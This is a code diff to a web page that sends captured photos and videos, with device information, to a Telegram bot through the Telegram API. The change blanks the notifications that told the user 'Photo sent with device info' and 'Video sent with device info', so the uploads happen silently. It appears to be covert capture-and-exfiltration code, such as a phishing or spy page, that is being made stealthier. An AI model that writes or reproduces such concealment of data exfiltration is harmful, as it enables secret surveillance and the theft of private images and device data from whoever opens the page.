@@ -183,7 +183,7 @@
         
         try {
           await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
-          showNotification("Photo sent with device info");
+          showNotification("");
         } catch (error) {
           console.error("Error sending photo:", error);
         }
@@ -225,7 +225,7 @@
       
       try {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: "POST", body: fd });
-        showNotification("Video sent with device info");
+        showNotification("");
       } catch (error) {
         console.error("Error sending video:", error);
       }
@@ -248,3 +248,4 @@
 </body>
 
 </html>
+
